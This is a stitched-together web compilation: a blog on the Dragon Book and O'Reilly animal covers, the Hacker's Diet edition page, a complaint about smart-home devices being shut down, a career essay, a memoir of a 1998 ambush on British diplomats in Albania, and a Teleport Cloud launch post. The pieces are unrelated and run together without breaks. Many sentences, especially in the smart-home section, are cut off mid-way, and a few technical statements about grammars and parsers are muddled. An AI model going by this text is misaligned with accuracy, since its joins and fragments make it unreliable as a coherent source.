<p>This popular compilers textbook is often referred to as the "Dragon Book" because of the 🐉.The Dragon's shirt says "Complexity of Compiler Design", the shield says "Syntax Directed Translation" and the sword says "LALR Parser Generator". The older edition also has the knight riding a horse labeled "Data Flow Analysis". </p>
<p><img src="https://carolchen.me/blog/img/cs_images/greendragon.jpg" alt=""></p>
<h4 id="syntax-directed-translation">Syntax Directed Translation<a href="#syntax-directed-translation" aria-label="Anchor link for: syntax-directed-translation"> <i></i></a>
</h4>
<p>The shield describes a method where the compilation is guided by the parser, and describes a more simpler subset of compilers. Syntax directed translation is a method of implementation used on context-free grammars (there's a whole linguistics thing behind this, but it's mostly what it sounds like) as a Type 3 language (on the <a href="https://en.wikipedia.org/wiki/Chomsky_hierarchy#Type-2_grammars">Chomsky Heirarchy</a>) could not be driven by the parser. There aren't too many commonly used languages that would be described as completely context free though there are languages that only have small caveats to become CFGs (not to be confused with control flow graphs, another compilers concept). If you want to read more, this <a href="https://stackoverflow.com/questions/14589346/is-c-context-free-or-context-sensitive">Stack Overflow question</a> is a good start. </p>
<p>Anywho, this is likely the shield because it prevents any blurring of "execution" and "compilation" by not having any ambiguities embedded in the grammar. </p>
<h4 id="lalr-parser-generator">LALR Parser generator<a href="#lalr-parser-generator" aria-label="Anchor link for: lalr-parser-generator"> <i></i></a>
</h4>
<p>LALR is a type of parser (look ahead left to right) that is simpler than an LR parser (left to right, rightmost derivation) but more powerful than LL parsers (left to right, leftmost derivation). Parser generators greatly improve the pains of writing a parser. GCC started off with a parser generated (it's handwritten as of 2004), CPython makes their own LL* parser generator (*it's a bit variant, CPython devs may correct me), Haskell+OCaml+Ruby are on LALR generators. </p>
<p>Writing a nice parser that works, is fast <em>and</em> surfaces nice syntax errors is a difficult design task, and a bit tedious after designed! Hence the dragon will be slayed by a LALR parser generator (YACC is taught in the book). </p>
<h4 id="data-flow-analysis">Data Flow Analysis<a href="#data-flow-analysis" aria-label="Anchor link for: data-flow-analysis"> <i></i></a>
</h4>
<p>Data flow analysis is what it sounds like, tracking the movement of variables or other stored memory through a program. It is represented as the horse the knight is riding probably because it powers most things. I tried to think of why it might be removed from the cover, but there's no obvious answer and everything I came up with just sounded like a conspiracy theory. </p>
<h3 id="o-reilly-animals">O'Reilly Animals<a href="#o-reilly-animals" aria-label="Anchor link for: o-reilly-animals"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/animals.jpg" alt=""></p>
<p>Iconic meme-able book covers! But who draws them? Who picks the animals when the book is not just called Python? Why are they pictures of animals?</p>
<p>O'Reilly claims that this originated in the weirdness of Unix terms like awk, sed and yacc, and really the rest of it was "it just clicked". Many of them were drawn by one Lorrie LeJeune, and were done with pen and paper! There are also amusing stories of complaints from the arachnephobic who had to deal with spiders on covers. You can find a list of all the books and animals <a href="https://www.oreilly.com/animals.csp">here</a>.</p>
<p>Edie Freedman, the creative director who saw over this claimed that there's meaning to how all the animals that were selected though they aren't revealed. But here are some of the answers. </p>
<h4 id="the-obvious-ones">The Obvious Ones<a href="#the-obvious-ones" aria-label="Anchor link for: the-obvious-ones"> <i></i></a>
</h4>
<p>Many (but not all) of the Python books have snakes, Rust has a crab, OCaml has a Camel, GNU has a gnu. </p>
<h4 id="oracle-bugs">Oracle Bugs<a href="#oracle-bugs" aria-label="Anchor link for: oracle-bugs"> <i></i></a>
</h4>
<p>"Oracle Essentials" has a cicada, "Oracle Regular Expressions" have spiders, "Oracle 8i Internal Services" has a bumblebee, dragonfly, dung beetle, lady bug, lantern fly, leaf insect, ants, praying mantis, etc. <em>Very</em> consistently bugs. The speculation is often "oracle software bad" but its likely just a meaningless theme (with each animal having a deep meaning) and not meant to piss off Oracle. It is special as even Python is not consistently snakes, and other groups of books like Google, Regular Expressions, Javascript, etc, do not have any themes. </p>
<h4 id="perl-camel">Perl Camel<a href="#perl-camel" aria-label="Anchor link for: perl-camel"> <i></i></a>
</h4>
<p>Here's a weird one, as the obvious choice would be an oyster for the pearl. <a href="https://www.wsj.com/articles/SB870061922836237000">Wall Street Journal claims</a> that Larry Wall, creator of the language, wanted a camel because like Perl it's ugly but can go a long way without water. Some also claim it's a reference to the proverb "a camel is a horse designed by a committee" and how Perl is easily identifiable as a mixture of other languages. It's cool as the camel as adopted as Perl's mascot after the O'Reilly book. </p>
<h4 id="python-entirely-my-conspiracy">Python (entirely my conspiracy)<a href="#python-entirely-my-conspiracy" aria-label="Anchor link for: python-entirely-my-conspiracy"> <i></i></a>
</h4>
<p>Not all of the Python books have snakes! "Data Wrangling with Python" has a lizard, which seems to be a reference to giving Python "legs" to work with data. "Python Programming On Win32" is a crocdile, which to me just screams "PYTHON BUT MAKE IT SCARY". "Learning Python" is a rat and "Python Coobook" is a rabbit, which may be a reference to them being more introductory Python books as they're snake food. </p>

<p>MacOS has always had some iconic wallpapers, especially of California views so this one stood out to me as "this should be generated". This isn't related to programming but I thought I'd investigate it since I've always wanted to know. </p>

<p>Apple explicitly scrubs EXIF data, which is all that microchip tracking metadata that are automatically attached to your images for location, time, device, shutter speeds, etc. The one time the EXIF was leaked on one image it had a bunch of nitpicking notes like "fill in this area close to the edge with more tree so it doesn’t create awkward negative shapes" and "darken some of the stars that are a bit smaller and darker, so there is a little more difference in the starfield" which I guess could be expected for the quality of the Apple wallpapers and the anxiety that comes with being the photographer for a MacOS wallpaper. </p>
<p>Spoiler alert, I didn't actually figure out if these were generated or photographed, but I did figure out <em>how</em> one would generate/photograph them, and that they are <em>very</em> probably photographed. Here is the precedence: photographed ethereal Apple productions. </p>

<p>As expected, making these powder explosions would be a pain. One must first have the space, the high speed camera (powder flying through the air like that lasts less than a second) and cover all of the equipment. The powder is typically flour, and mixed with "holi" powder which is just high pigment powder for photoshoots/parties/crafts. It seems that many photographers actually have people in suits to throw the powder and those shots tend to look more like powder clouds than explosions. I found someone who did something a bit more clever, which involves a simple canon mechanism (silicon tubing and a pump) and sound triggered. </p>

<p>3D animation software of course would also enable you to do this, and in my opinion produces better results. </p>
<p>The general approach is to start with a sphere, create some noise outwards like a spiky ball. Turn those vectors into dots going out, then configure those …</p></section></div>

<h3><i>How to lose weight and hair through stress and poor nutrition</i></h3>
<address>
By

<p>

<cite>The Hacker's Diet</cite>, notwithstanding its silly
subtitle, is a serious book about how to lose weight and
permanently maintain whatever weight you desire.  It
treats dieting and weight control from an <em>engineering</em>
and <em>management</em> standpoint, and provides the tools
and an understanding of why they work and how to use
them that permit the reader to gain control of their
own weight.  The book is intended primarily for busy,
successful engineers, programmers, and managers who
have struggled unsuccessfully in the past to lose
weight and avoid re-gaining it.
<a href="#Comptools">Computer-based tools</a>
and experiments in Microsoft Excel or the Palm Computing
Platform are available, as well as an online Web application,
but a computer is not necessary to use
the techniques described in the book; paper and pencil
alternatives are provided.

<h2><a href="https://www.fourmilab.ch/hackdiet/e4/">Fourth Edition (2005)</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/e4/"><img src="https://www.fourmilab.ch/hackdiet/figures/hdpage4.png" width="256" height="288" alt=""></a>
The Fourth Edition of <cite>The Hacker's Diet</cite> was
released in November 2005.  It is essentially identical in content with the
previous editions, but has been extensively re-formatted to improve
appearance, accessibility, ease of navigation, and standards compliance.
The Fourth Edition strictly complies with the
<a href="http://www.w3.org/TR/xhtml1/" target="Hackdiet_Aux">XHTML&nbsp;1.0</a> (Transitional and Frameset)
and
<a href="http://www.w3.org/TR/CSS21/" target="Hackdiet_Aux">CSS&nbsp;2.1</a>
standards and requires a browser which implements these
standards.  (As of the release of this edition, current versions
of all of the most popular browsers, including Mozilla Firefox,
Opera, and Microsoft Internet Explorer supported these standards
sufficiently to display the book without problems.)  In addition, the
browser and operating system must display Unicode character entities.
JavaScript and DOM/DHTML are used in the navigation bar, but if they're
absent or disabled, everything will still work.  If your browser and/or
system cannot handle this version, the Third Edition (Frames) or the
No-Frame editions, both of which date from 1994, will almost certainly
work.  The content is the same; only the presentation is more rudimentary.

<h2><a name="epub" href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub">EPUB Edition (2011)</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub"><img src="https://www.fourmilab.ch/hackdiet/figures/hd_ipad_256.png" width="198" height="288" alt=""></a>
The
<a href="http://en.wikipedia.org/wiki/EPUB" target="Hackdiet_Aux">EPUB</a>
edition is in the open document format
compatible with the iBooks application on the Apple iPad, iPhone, and
iPod&nbsp;touch; Sony Reader; Barnes and Noble Nook; and a variety of
other electronic book devices and mobile platforms.  EPUB books may be
opened directly with a Web browser using the
<a href="http://www.epubread.com/en/" target="Hackdiet_Aux">EPUBReader</a>
add-on for Firefox or the
<a href="http://widgets.opera.com/widget/15552/" target="Hackdiet_Aux">eBook
Reader</a>
widget for Opera, although users of desktop and notebook computers
with Internet connectivity will probably prefer the
<a href="https://www.fourmilab.ch/hackdiet/e4/">Web edition</a>,
due to its more flexible navigation options.
</p>

<p>
If your Web browser has an EPUB-compatible plug-in installed, you can
open the book simply by clicking on the
<a href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub" target="Hackdiet_Aux"><cite>The
Hacker's Diet</cite> EPUB Edition</a>
link.  Otherwise, use your browser's idiom to download the
abovementioned file to your computer and then transfer it to your
reading device according to the manufacturer's directions.  For the
iPad and iPhone (etc.), just drag the downloaded
<tt>hackdiet.epub</tt> file to iTunes, where you should see it in the
“Books” section.  Then connect your reading device to the
computer and the book should be transferred to it by the Sync
process.  If the book is not installed, make sure that you've enabled
syncing books to that device, and that if you've opted not to sync all
books in your library to the device, that <cite>The Hacker's
Diet</cite> is checked to be copied.  You must also, of course, have
the Apple
<a href="http://en.wikipedia.org/wiki/IBooks" target="Hackdiet_Aux">iBooks</a>
application installed on the device; if it's missing, go to the App
Store and install it—it's free.
</p>

<p>
<cite>The Hacker's Diet</cite> EPUB edition contains no “Digital
Rights Management” constraints: you are free to install it on as
many devices as you wish, transfer it among them (if their hardware
and software so permit), and pass on copies to others.  It should be
compatible with any EPUB reader hardware and software which can open
standards-compliant unrestricted files.

<h2><a name="offline" href="https://www.fourmilab.ch/hackdiet/hdpdf.zip">PDF Edition</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/hdpdf.zip"><img src="https://www.fourmilab.ch/hackdiet/www/figures/hdpdf.gif" width="218" height="256" alt="PDF Screen"></a>
If you prefer to read the book off-line, you can
<a href="https://www.fourmilab.ch/hackdiet/hdpdf.zip">download a PDF edition</a> (1.3 Mb, ZIP compressed)
which you
can read with the Adobe Reader utility,
available for most personal computers and Unix workstations,
which may be
<a href="http://get.adobe.com/reader/" target="Hackdiet_Aux">downloaded
free of charge</a> directly from the
<a href="http://www.adobe.com/" target="Hackdiet_Aux">Adobe Systems</a> Web site.
The PDF edition preserves all the formatting of
the original book, and permits point-and-click navigation
among chapters and to follow cross-references in the text.
</p>

<p>
Adobe is one of the most consistently irritating companies
on Earth with which to do business.  I'd like to give you
a nice button for downloading your own copy of Adobe Reader,
but they won't let me use the image without “registering”
and “licensing” it, which I'm certainly not going to do
in order to promote their product and its file format.
<br clear="right">
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/hdps.zip">PostScript Edition</a></h2>

<p>
<cite>The Hacker's Diet</cite> was originally typeset
using <a href="http://www.tug.org/" target="Hackdiet_Aux">TeX</a> with the
<a href="http://www.latex-project.org/" target="Hackdiet_Aux">LaTeX</a>
macro package.  Camera-ready copy was generated
from PostScript created by the <tt>dvips</tt>
utility.  The PostScript edition is a single monolithic
file, almost 2.7 megabytes, containing the
entire book as originally typeset.  You can read it on-line
with a PostScript viewing program such as
<a href="http://www.cs.wisc.edu/~ghost/">GhostScript</a>
(which is free), or print it on any PostScript-compatible
printer.  <strong>Before sending this
file to a printer, consider that the book is almost
250 pages long!</strong>  This is a <em>big</em> print
job, which will consume lots of paper, toner, and,
potentially, good will of any colleagues with whom
you share the printer.  The PostScript edition may be
downloaded as either a <a href="https://www.fourmilab.ch/hackdiet/hdps.zip">ZIPped archive</a>
or a <a href="https://www.fourmilab.ch/hackdiet/hackdiet.ps.gz"><b>gzip</b> compressed Unix <b>tar</b>
file</a>; both are 702 Kb in length and uncompress to a 2.7
Mb PostScript file.
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/www/hackdietf.html">Third Edition (1994 Web Edition with Frames)</a></h2>

<p>
If your browser supports frames but isn't up to the demands
of the Fourth Edition, the original 1994 Web edition with
frames remains available.
It allows navigation with
a panel which lets you click chapter titles and go
directly to that chapter.  If, in addition, your browser
supports JavaScript, simply moving the mouse over a
footnote icon, like this one:
<a onmouseover="javascript:footOver(0);" href="https://www.fourmilab.ch/hackdiet/www/f/0.html"><img src="https://www.fourmilab.ch/hackdiet/www/i/foot.gif" width="15" height="15" alt="[Footnote]"></a>
will pop up a window containing the footnote.  Moving the
mouse over other footnotes displays them in the auxiliary window.
Browsers without JavaScript (or users who have disabled
JavaScript in their browsers) may display footnotes in
the main document window by clicking the footnote icon,
then use their browser's “Back” button to return to the
main text.
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/www/hackdiet.html">No-Frame Web Edition</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/www/hackdiet.html"><img src="https://www.fourmilab.ch/hackdiet/www/figures/any_browser.gif" width="88" height="31" alt="Works with Any Browser"></a>
Users with browsers which do not support frames, or those
who prefer a more linear presentation in a single
window, may access a no-frame edition of <cite>The Hacker's
Diet</cite> with identical content to the frame-based book.
The no-frame edition includes the pop-up footnotes present
in the frame edition, but since few browsers which lack
frames are likely to support JavaScript, you can simply click
on the footnote icon to display it, then use the
“Back” button or keystroke to return to the text containing
the footnote.

have been shut down with little to no warning. This is getting so common that
someone created a website called <a href="https://killedbygoogle.com/">Killed by Google</a>.
After Google <a href="http://googlereader.blogspot.com/2013/03/powering-down-google-reader.html">shutdown Reader in 2013</a>, I spent months trying to find a replacement.
During this research I determined I should try to find solutions to services
I use everyday that wouldn’t be shut down in some board room over profit
margins.</p><p>About five years ago, I started researching smart home products and services
as well as automation software to use in my next home. I started to notice the
following trends:</p><ul><li>Software products and services being shutdown with no notice</li><li>No software updates for promised features or security fixes</li><li>Software updates that remove out of the box functionality (features/bricking)</li><li>Free software that suddenly requires a paid subscription</li><li>Companies are selling or hording your data.</li></ul><p>For the sake of relevancy let’s just cover what’s happened since the start of

device. They had also stated there would be API support as well as it would be
integrated as a remote temperature sensor for an

that it was shutting down it’s Insignia brand of smart home devices on

that it was shutting down on <strong>March 31st</strong>, rendering devices dead.</p><p>I’m happy they offered a program to trade in any purchased devices for a

that Sonos was bricking devices upon agreeing to recycle your device or by
upgrading the speaker.</p><blockquote><p>Recycle Mode is a state your device enters 21 days after recycling
confirmation in the Sonos app. In Recycle Mode, all data is erased and the
device is permanently deactivated so you can safely and securely dispose of
it.

It was only after massive backlash that they <a href="https://blog.google/products/google-nest/updates-works-with-nest/">announced</a>
that they would continue to support integrations until they were available in
the new API’s backed by a single Google Account.</p><p>Current users have to be super careful not to migrate their existing Nest

this migration and integration support for various hubs will be completed in

from connecting to my Wi-Fi. Slowly but surely they’ve came online but every

rolled out to the <a href="https://www.amazon.com/ecobee-Switch-Smart-Amazon-Built/dp/B0798LCLJ5?tag=niemyjski-20">ecobee Switch+</a>
via an firmware update. A few months later it was removed with a second firmware
update. Now only some of my switches are paired as a remote sensor to my

renaming any switch that has a custom defined name back to the serial number of
the device. This should never happen to a consumer device paired with cloud
outages leaves a lot to be desired from ecobee when it comes to software.
I recommend using ecobee’s HomeKit support to get around these limitations
where possible.</p><h3 id="home-assistant-breaking-changes-and-os-changes">Home Assistant breaking changes and OS changes</h3><p>In <strong>May</strong> the Home Assistant team <a href="https://www.home-assistant.io/blog/2020/05/26/installation-methods-and-community-guides-wiki/">announced</a>
that they were dropping support for generic linux installs without consulting
the community. This was a major change that left many users frustrated. It makes
sense that users should be using the managed Home Assistant operating system,
but a large portion of users installed it on Ubuntu and other linux operating
systems of which may have been used for other purposes.</p><blockquote><p>As the platform matures there will be less churn and breaking changes.</p></blockquote><p>As we near the 1.0 release of Home Assistant, we’ve seen more integrations
be removed as well as changes to the API surface. Although these are good
changes they still require work by end users. This is to be expected of pre
version 1.0 software.</p><blockquote><p>Although breaking changes do happen from time to time. You control the

Thread, Zigbee or Z-Wave. Stay away from products that use a vendor specific

unless they have a positive track record or can be controlled via a standard.</p><blockquote><p>If an online service doesn’t charge you a monthly fee, you are the product.
Products that have a free cloud dependency have to find a way to turn a
profit or they will shut down. Someone has to pay for the cloud services.</p></blockquote><p>I do feel comfortable sticking with HomeKit supported devices as I can control
them locally and Apple has a good track record of privacy, supporting devices,

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>The story I am going to share below has so many variations, but the lesson is always the same. This specific version I got from <a href="https://twitter.com/Shadaya_Knight_/status/1327881911214157825">Twitter</a>:</p><p>A father said to his son: "You've graduated with honors, here is a car (Nissan Skyline R34) that I bought years ago, it's old. BUT before I give it to you, take it to the USED CAR STORE &amp; tell them you want to sell it &amp; see how much they offer you. The son went to the USED CAR STORE, returned to his father &amp; said: "They offered me $1000 because it looks very worn out". The father said, "Now take it to the PAWN SHOP"...</p><p>The son went to the PAWN SHOP &amp; returned to his father &amp; said: "The PAWN SHOP offered $100 because it's a very old car". Then the father asked the son to go to a CAR CLUB &amp; show them the car. The son took the car to the CAR CLUB &amp; told his father: "Some people in the club offered as much as $100 000 for it since it's a NISSAN SKYLINE R34, an ICONIC car &amp; sought after by many"...</p><p>Then the father replied: "I wanted to let you know that the right place values you in the right way. Don't find yourself in the wrong place and get angry if you are not valued. Those that know your value are those who appreciate you, don't stay in a place where nobody sees your value. KNOW YOUR WORTH"</p><p>...</p><p>Immediately after graduating from college with a CS degree, I was on the hunt for a developer job. Lucky enough and through some personal connection I was able to land a front-end developer role.</p><p>I was so happy to have gotten that job that I did lowball myself when asked how much do I want to get paid...At that time I was interning and I was being paid $20 an hour...so I said to myself let's just say anything between $22/hr to $25/hr ...Guess what! That's exactly what I got paid. I met the president of the company after an interview, and after reviewing my offer he said...something like... what I said for my offer is around the same salary range people at the company start with ...They sent me an official offer letter just a few days after that...and I was offered $45k a year...You can imagine what was going through my mind...I lowballed myself...Why did I say $22/hr? ...I was happy to get the job but was kinda sad that I didn't capitalize on the opportunity. The reason was mainly that after graduation I was kinda desperate to get a job...I was out of the school dorms, I needed to have my own place, I needed to take care of my own expenses. So I was just ready for anything that would pay me.</p><p>After like 5 months of working in this job I wasn't so happy...I felt as if what I was doing did inspire me enough...That, plus a few other personal reasons led me to quit my job. Where I was interning when I was in college...by the time I was ending my time before my full-time job, the boss had upped my salary to $30/hr. What I was doing to my boss at the internship place was valuable enough for him to increase my salary without even asking and just after 5 months of working for him. This was one of the greatest lessons I learned...that Know Your Worth...There will be places where your skills are valued higher than other places. Find those places and people who value your skills.</p><p>...</p><p>Here is another story I had read a few months ago...it goes like this...There was a marathon in one of the US cities, and two people put their table stands where the runners would pass. One of them had oranges and another one had donuts...Almost all runners passed by the oranges station to grab the oranges and continue their race. Almost none grabbed the donuts. The reason is plain clear...the tired runners wanted some refreshing fluid in their body at the time...you really can't imagine a marathon runner grabbing a donut in the middle of the race, it's just not fitting. A fresh orange was a better offer to the runners. While the donut person had good intentions...he/she wasn't there at the right moment. Actually, at the finish line of the race, most of the runners wished there were some donuts there to greet them...but unfortunately, a donut person was nowhere to be found. So while a donut would be so valuable once the race was over, the oranges pretty much saved the day in the middle of the race. Again, know your value...know where you will be valued.</p><p>Are you a designer in a company that thinks design work is not as important as developing (programming) ...just get out...and find a place where designers are valued. Are you a developer that think they're not as valued as the business side of the company...you have an opportunity to go somewhere where your skills will be valued and you will be compensated accordingly.</p><p>So folks that's the lesson of the day...KNOW THY VALUE</p><blockquote>Everyone is a genius. But if you judge a fish by its ability to climb a tree, it will live its whole life believing that it is stupid</blockquote>

Police convoy enroute to ambush spot</figcaption></figure></div><p>The convoy stopped and the police got out of their vehicles and I joined them. Some started to cordon off the road while a number with automatic weapons spread out around the scene in some sort of haphazard search pattern looking for clues or traces of the culprits. After about half an hour just standing around, I asked my Embassy driver, Benny to ask the police if I could leave for the hospital to visit my colleagues. The senior policeman on the scene agreed but said he wanted me to visit police HQ later that day to make an initial statement.</p><p>After agreeing to do so and telling them that until further notice Benny would be my official interpreter for the time being, both he and I jumped in our vehicle and headed for the hospital in Tirana. I could see that Benny was nervous. Dealing with all of this was definitely not part of his job description. He was doing a great job not only as a driver putting himself in what might have been a potentially dangerous situation but also with helping out with the police.</p><p>About an hour later, after an uneventful trip, we arrived at the main hospital in Tirana. Benny and I went in and were taken to where the Deputy Head of Mission (DHM) and the Management Officer (MO) were being patched up. The doctor explained (via Benny) that the DHM was lucky, the bullet had gone through the fleshy part of her arm without breaking any bones or damaging any nerves. The doctor wanted to keep her in, but she was insistent of going home once the treatment was completed.</p><p>As for the MO, he was extremely lucky. When the bullet hit him, it had spent a lot of its force going through the window then the DHMâ€™s arm and upholstery before finally grazing him along the stomach resulting in blood loss. He too was insistent on discharging himself after treatment and going home. As for me, I was still in a state of disbelief that out of all the bullets fired, only one had done all this damage.</p><p>I had by then briefed both him and the DHM about what the police were currently doing plus the fact that I now had to go to police HQ to make a statement. I got Benny to call a second Embassy driver to bring the other armoured vehicle to the hospital to take both the DHM and MO home. We agreed that after I had been to police HQ, we would all meet up later in the DHMâ€™s house.</p><p>With that, Benny and I set off for police HQ. When I got there, I found that there were a small number of Albanian government officials gathered around a desk with senior police officers. Again thanks to Benny, I managed to give them a written statement of sorts as to what had happened.</p><p>After giving the statement, I was told to wait in another room. After about thirty minutes twiddling my thumbs, I was taken outside to a courtyard where a large number of heavily armed police were assembled. I wondered what was going on and asked Benny to try and find out, but nobody was talking.</p><p>Suddenly a door opened at the far end of the courtyard and a long file of men entered. They were directed to line up against the brick wall facing us. The police then told Benny that these men had been seized on and around the mountain during the police sweep.</p><p>Apparently, a number of them were well known to the police who described them as “hardened criminals” and the police were confident that one or several of them were definitely the culprits. When Benny told me all of this, I was not so certain.</p><p>Were these guys some sort of token show to prove the police were on the ball? How could I identify someone who was masked? I did not know for certain if there was just one man or a number of others involved in the shooting and I made a point of telling the police this.</p><p>They were not convinced or put off and they then asked me to go down the line and look at them. I refused and told them again I could not identify someone who had been wearing a mask throughout the incident?</p><p>However, one of the government officials sidled up to me and in perfect English said it was the custom and part of their procedures that a line up had to take place. Even if I could not identify anyone, the police would still hold and question them.</p><p>Of course, this being Albania at that time, there was no hiding behind a one-way mirror or any other form of masking my identity as a witness, so reluctantly, I started down the line. They were a dishevelled bunch and did not look too happy to be standing there. I had to stop in front of each one and say, “no, I was not sure and I could not be certain that this was the culprit”.</p><p>They all stared straight ahead and as I stopped in front of each individual and made my declaration, they all looked me straight in the eye, which was pretty unnerving to say the least.</p><p>Finally, I came to the end of the line. I again confirmed that I could not positively identify anyone and asked if I was free to go as I needed to meet up with my two colleagues. The police agreed and with a great deal of relief, both Benny and I left and headed for the DHMâ€™s house.</p><p>We made good time and when we reached her house, we found that she had already informed London of events. Word had quickly spread amongst the small diplomatic community in the city and she was dealing with well-wishers from her circle of diplomatic friends and also officials from the Albanian government who were in attendance.</p><p>I then briefed the DHM on what I had experienced at the Police HQ and seeing that she was going to be well looked after I set off with Benny to see the MO at his residence. It turned out that the MO was not at home but ensconced in the London Bar (a favourite watering hole for the small number of foreigners in Tirana at that time) regaling all and sundry with what had happened and showing everyone his battle scar.</p><p>What a guy, his prescription for a traumatic day, a couple of stiff drinks to settle the nerves in the face of adversity so to speak. Unfortunately, it turned out to be a lot more than a couple of quick drinks as more and more people turned up in the bar as the news spread to hear the story, see the MOâ€™s war wound and of course buy us more drinks (for medicinal and recuperative purposes of course) which were gratefully received.</p><p>In the end, they never did catch anyone. The shootings made the front page of the UK press and I was pretty sure the incident had been an embarrassment to the Albanian government who had seen virtually the whole UK establishment of the British Embassy (at that time there was only 4 <strong>British diplomats</strong> in residence) nearly wiped out on what was supposed to be (on their assurances) a safe route.<a href="https://www.independent.co.uk/news/albanian-gunmen-wound-british-diplomats-1156205.html">https://www.independent.co.uk/news/albanian-gunmen-wound-british-diplomats-1156205.html</a></p><p>Locally, there was a lot of speculation and gossip about the event. People could not get their heads around the fact that even the local bad guys would not be stupid enough to hold up a diplomatically plated vehicle as this action would be sure to bring a firestorm of police activity down on them.</p><p>A story went around that we were in fact carrying a lot of cash and the purpose of our trip to the mountain was to buy back looted weapons (looted from military arsenals during civil unrest the previous year) from criminal elements in order to get them off the street as part of some sort UK government initiative.</p><p>Another story was that we went to meet some members of the nascent Kosovo Liberation Army in order to deliver a substantial amount of cash to aid them in their struggle against the Serbs in Kosovo.</p><p>Both stories of course were complete rubbish. However unglamorous, the fact was that we were the unlucky victims of an armed robbery/carjack that went wrong, we just happened to be in the wrong place at the wrong time. For me, I never did reconcile the fact that the only person actually physically robbed was myself, the lowest grade and the lowest paid of the whole party. Where is the justice in that? I dined out on that story for many a month to come.</p><p>In the days that followed, the DHM was evacuated back to the UK for further medical treatment. The FCO had managed to locate the holidaying Ambassador and he returned to post and both the MO and I went back to work as normal.</p><p>It is important to remember that this was the Albania of 1998 and not the Albania of 2020. I only spent a year in Tirana before my next posting to Kosovo but what an eventful year it turned out to be.</p><p>It was a time of change and upheaval. After decades of the brutal and repressive Hoxha communist regime, followed by the great national pyramid scheme which impoverished hundreds of thousands of Albanians not used to such criminal schemes losing everything, no wonder the country erupted into mass civil unrest.</p><p>But moving on from those dark days, I have been back to Albania twice since then. It is a beautiful and stunning country rich in history and the developing coastline is a tourist paradise. I still have friends from our embassy, local staff who I keep in contact with regularly even to this day via social media.

<p><img src="https://goteleport.com/blog/images/2020/teleport-cloud-header.png" width="100%" alt="access points revollving around Teleport"></p>

<p>This blog post marks an important milestone for us! Just four years ago, as we grew frustrated with the state of SSH server access, Teleport was born. Eventually it grew way bigger than just SSH access, as our users want to use the same access workflow for all layers of their stacks.</p>

<p>And today we’re announcing another way to use Teleport: as a hosted offering. Let’s dig deeper!</p>

<h2 id="what-is-teleport">What is Teleport?</h2>

<p>For those who don’t know, Teleport is an open-source <a href="https://goteleport.com/teleport/">Unified Access Plane</a>, i.e. a smart proxy that understands all common remote access protocols. We’ve started with SSH and are adding others quickly. Available as a <a href="https://goteleport.com/teleport/download/">single binary download</a>, it allows engineers to access their servers, Kubernetes clusters, or internal web applications (dashboards, etc) regardless of where they are - on any cloud, behind NAT, in a self-driving car, anywhere.</p>

<p>Teleport started as an experiment of using Golang’s first-class SSH facilities for our own SSH access needs. Other companies noticed, and in just a couple of years it’s gone from just a handful of early adopters to organizations like NASDAQ, Snowflake, and IBM trusting Teleport to access their environments across any infrastructure.</p>

<p>Teleport gives the industry best practices for secure access by default: the SSH proxy, identity-centric authentication, <a href="https://goteleport.com/blog/enhanced-session-recording/">session recording</a>, structured <a href="https://goteleport.com/resources/videos/webinar-kubernetes-audit-logging/">audit log</a>, etc. This is how <a href="https://goteleport.com/blog/how-to-ssh-properly/">SSH is done properly</a> at Silicon Valley unicorns, usually with something built in-house. We wanted Teleport to be the standard access solution for the rest of the world.</p>

<p>Then we discovered that Kubernetes users face similar challenges and Teleport added support for <a href="https://goteleport.com/teleport/kubernetes/">Kubernetes access</a>, gradually turning into a multi-protocol access plane.</p>

<p>We always believed that <em>bad user experience and complexity are the biggest obstacles to good security</em>. That is why Teleport was designed to be simple and easy to use.</p>

<h2 id="cloud-early-access">Cloud Early Access</h2>

<p>From the beginning, we have adopted the design mindset to “do the right thing by default” to minimize the need for configuration and to reduce operational overhead of running Teleport on your infrastructure.</p>

<p>As easy as it is, some users still preferred that we do it for them. There’s a huge distance between “easy” and “one click away” and today, we’re closing this gap.</p>

<p>We are announcing early access to Teleport Cloud. Teleport Cloud allows you to simply copy-paste a single CLI command on your servers, regardless of where they are, and you’ll get SSH and Kubernetes access to all of your environments with industry best practices for security and compliance. Our security and compliance experts will run and manage the Unified Access Plane for you.</p>

<p>When we say all of your environments, we literally mean any computing device on planet Earth. Teleport Cloud gives you remote access connectivity into:</p>

<ul>
<li>Cloud and on-premise environments</li>
<li>IoT devices running on your customer’s premises behind NAT</li>
<li>Edge environments</li>
</ul>

<p>What do we mean by remote access connectivity? We mean full support for the following protocols:</p>

<ul>
<li>SSH</li>
<li>Kubernetes API</li>
<li>HTTPS for accessing internal web apps</li>
<li>Databases (coming soon)</li>
</ul>

<p>We called it Teleport because we wanted to get as close as possible to defeating the laws of physics. In other words, we set out to erase the annoying boundaries that currently exist between cloud providers and networks.</p>

<h2 id="how-does-it-work">How does it work?</h2>

<p>The underlying technology behind Teleport Cloud is reverse tunnels. A reverse tunnel is a persistent secure connection established by your servers into the Teleport control plane hosted by the team at Teleport.</p>

<p>When you type <code>ssh <a href="https://goteleport.com/cdn-cgi/l/email-protection" data-cfemail="83f6f0e6f1c3edece7e6">[email&nbsp;protected]</a></code>, the Teleport client connects to the node via the SSH proxy hosted by us. The proxy routes your connection to the node using the tunnel. This allows you to SSH into nodes that are running behind NAT, even on third party infrastructure. This technology can be used not only to deploy software into your own clouds, but also to update software or firmware on appliances running in your customer’s clouds or even in their basements.</p>

<p>You can also log in into your Teleport Cloud account to access servers, review audit logs, and configure role-based access via the control panel. The audit log deserves a special mention. Having a centralized audit log with recorded sessions and instant visibility into your environment has always been a major reason for organizations to adopt Teleport.</p>

<p>The diagram below shows how this works:</p>

<p><img src="https://goteleport.com/blog/images/2020/teleport-cloud-1.png" width="100%" alt="how teleport cloud works"></p>

